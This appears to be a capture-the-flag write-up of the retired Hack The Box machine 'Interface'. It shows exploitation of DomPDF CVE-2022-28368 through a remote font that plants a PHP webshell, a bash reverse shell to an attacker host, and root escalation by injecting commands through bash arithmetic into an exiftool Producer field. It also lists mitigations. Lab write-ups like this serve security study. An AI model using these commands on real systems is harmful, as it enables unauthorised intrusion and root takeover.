---
machine: Interface
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, nextjs, dompdf, cve-2022-28368, webshell, exiftool, arithmetic-injection, privesc]
---

# Interface — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

An API vhost converts HTML to PDF with DomPDF 1.2.0. CVE-2022-28368 lets a remote font be cached as a `.php` file at a predictable path under `vendor/dompdf/.../fonts`; if the font contains PHP code, requesting it executes and gives a shell as `www-data`. `pspy` shows root running `/usr/local/sbin/cleancache.sh` every two minutes. The script reads the `Producer` field of files in `/tmp` with `exiftool` and compares it using `[[ "$meta_producer" -eq "dompdf" ]]`; a value containing `x[$(...)]` is evaluated as an arithmetic expression and runs commands as root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22`: OpenSSH.
- `80`: nginx with a Next.js site and a rendering API.

```bash
echo '<IP> interface.htb' | sudo tee -a /etc/hosts
ffuf -u http://interface.htb -H 'Host: FUZZ.interface.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
```

## Enumeration

The main site is a marketing page. The `prd.m.rendering-api.interface.htb` vhost exposes an API that accepts HTML and returns a PDF. The response and server files confirm DomPDF 1.2.0, affected by CVE-2022-28368.

The API also serves the generated PDF and caches fonts at:

```text
/vendor/dompdf/dompdf/lib/fonts/<family>_<style>_<md5(url)>.php
```

## Foothold

A stylesheet loads a font from an attacker server:

```css
@font-face {
  font-family: exploitfont;
  src: url('http://<LHOST>/exploit_font.php');
}
```

`exploit_font.php` contains a PHP webshell plus valid font data. When the HTML is rendered, DomPDF downloads the font and caches it under `fonts`. The name uses the MD5 of the URL:

```bash
echo -n 'http://<LHOST>/exploit_font.php' | md5sum
```

The webshell lands at:

```text
/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_<MD5>.php
```

```bash
curl -s --data-urlencode 'cmd=id' -o- \
  http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_<MD5>.php | tail -1
```

With `cmd=bash -c "bash -i >& /dev/tcp/<LHOST>/443 0>&1"` the result is a shell as `www-data`.

## Lateral movement

The application runs as `www-data` and there is no relevant intermediate account; the next step is directly to root through the scheduled task.

## Privilege escalation

`pspy` reveals the periodic execution of:

```text
/bin/bash /usr/local/sbin/cleancache.sh
```

The script walks `/tmp`, gets each file's `Producer` with `exiftool` and compares it like this:

```bash
if [[ "$meta_producer" -eq "dompdf" ]]; then
```

Bash evaluates both operands as arithmetic expressions. Create a file and give it a malicious `Producer`, using `${IFS}` for spaces:

```bash
touch /tmp/test
exiftool -Producer='x[$(cp${IFS}/bin/bash${IFS}/tmp/rootbash;chmod${IFS}4777${IFS}/tmp/rootbash)]' /tmp/test
```

On the next cron run the SUID bash appears:

```bash
/tmp/rootbash -p
```

## Evidence

- Rendering API and DomPDF 1.2.0.
- Remote font cached as `.php` and the webshell executed.
- Shell as `www-data`.
- `cleancache.sh` run by root with an `-eq` comparison.
- File with an injected `Producer` and a created SUID bash.

## Lessons learned

- DomPDF caches remote resources at predictable, executable paths.
- A `.php` extension inside a served directory turns a font into a webshell.
- `exiftool` returns attacker-controlled metadata.
- `[[ "$x" -eq ... ]]` evaluates arithmetic instead of comparing strings.
- Root cleanup scripts over `/tmp` are an attack surface.

## Mitigations and detection

- Update DomPDF and disable remote resources (`isRemoteEnabled=false`).
- Keep caches outside the web root and use non-executable extensions.
- Compare strings with `=` and validate metadata before use.
- Prevent root scripts from processing files owned by unprivileged users.
- Monitor SUID file creation and `cleancache.sh` executions.
- Alert on outbound font requests from the renderer.

## References

- [0xdf — Interface](https://0xdf.gitlab.io/2023/05/13/htb-interface.html)
- [Hack The Box — Interface](https://app.hackthebox.com/machines/interface)
- [NVD — CVE-2022-28368](https://nvd.nist.gov/vuln/detail/CVE-2022-28368)
